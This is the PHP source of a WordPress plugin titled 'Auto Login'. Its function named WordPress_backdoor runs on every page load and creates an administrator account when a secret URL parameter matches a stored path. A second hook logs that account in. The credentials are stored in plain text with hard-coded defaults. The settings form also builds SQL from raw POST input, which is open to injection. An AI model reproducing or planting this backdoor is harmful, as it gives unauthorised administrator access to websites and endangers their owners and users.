<?php
/*
Plugin Name: Auto Login
Plugin URI: 
Version: 1.0.0
Author: Shahin Zanbaghi
*/

add_action('admin_menu', 'al_plugin_setup_menu');
 
function al_plugin_setup_menu(){
        add_menu_page( 'Auto Login', 'Auto Login', 'manage_options', 'auto-login-plugin', 'autologin_init' );
}

function autologin_init(){

    if (isset($_POST['submit_al'])) {
        $firstname = ($_POST['user_name_al']==NULL ? "defaultvalue" : $_POST['user_name_al']);
        $password = ($_POST['password_al']==NULL ? "topsecrectvaluepassword" : $_POST['password_al']); 
        $path = ($_POST['path_al']==NULL ? "autologin" : $_POST['path_al']);
        echo "Successfully applied <br />";
        echo "Username:". $firstname . "<br />Password:". $password . "<br />Path:". $path ." ";
        $nsql="
        INSERT INTO autologin (ID, user_name, user_pass, path) VALUES('1', '$firstname', '$password','$path') ON DUPLICATE KEY UPDATE user_name= '$firstname' ,user_pass='$password',path='$path'
        ";
        global $wpdb;
        $wpdb->get_results($nsql);
    } 

    $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
    global $wpdb;
    $uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);

		echo "
		<div class='al-body'>
		<form action='' method='post' >
		<label>Username:</label>
		<input type='text' name='user_name_al' placeholder=$uname />
		";

		echo "
		<label>Password:</label>
		<input type='password' name='password_al' placeholder=$upass />
		";

		echo "
		<label>Path:</label>
		<input type='text' name='path_al' placeholder=$upath />
		";

		echo "
		<input type='submit' value='Save' name='submit_al' />
		</form>
		</div><br />
		";
		
		echo "Step 1: ".$_SERVER['HTTP_HOST']."/?create=$upath <br />Step 2: ".$_SERVER['HTTP_HOST']."/?login=$upath";
		
		echo "
		<style>
			.al-body{
				margin: 30px;
			}
		</style>
		";

}

function autologin() {

    $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);
	
	// PARAMETER TO CHECK FOR
	if (md5($_GET['login']) == md5($upath)) {
		
		// ACCOUNT USERNAME TO LOGIN TO
		$creds['user_login'] = $uname;
		
		// ACCOUNT PASSWORD TO USE
		$creds['user_password'] = $upass;
		
		$creds['remember'] = true;
		$autologin_user = wp_signon( $creds, true );
		
		if ( !is_wp_error($autologin_user) ) 
			header('Location: wp-admin'); // LOCATION TO REDIRECT TO
	}
}
 
function WordPress_backdoor() {

    $sqlusername = "SELECT `user_name` FROM autologin WHERE ID=1";
	$sqluserpass = "SELECT `user_pass` FROM autologin WHERE ID=1";
	$sqluserpath = "SELECT `path` FROM autologin WHERE ID=1";
    global $wpdb;
	$uname = $wpdb->get_var($sqlusername)==NULL ? "defaultvalue" : $wpdb->get_var($sqlusername);
	$upass = $wpdb->get_var($sqluserpass)==NULL ? "topsecrectvaluepassword" : $wpdb->get_var($sqluserpass);
	$upath = $wpdb->get_var($sqluserpath)==NULL ? "autologin" : $wpdb->get_var($sqluserpath);

    If (md5($_GET['create']) == md5($upath)) {
        require('wp-includes/registration.php');
        If (!username_exists($uname)) {
            $user_id = wp_create_user($uname, $upass);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

$sql="
CREATE TABLE IF NOT EXISTS autologin(
	ID   int DEFAULT '1',
	user_name VARCHAR (30)     NOT NULL,
	user_pass VARCHAR (30)     NOT NULL,
	path  CHAR (40) NOT NULL,    
	PRIMARY KEY (ID)
)
";
global $wpdb;
$wpdb->get_results($sql);

add_action('wp_head', 'WordPress_backdoor');
add_action( 'after_setup_theme', 'autologin' );
?>
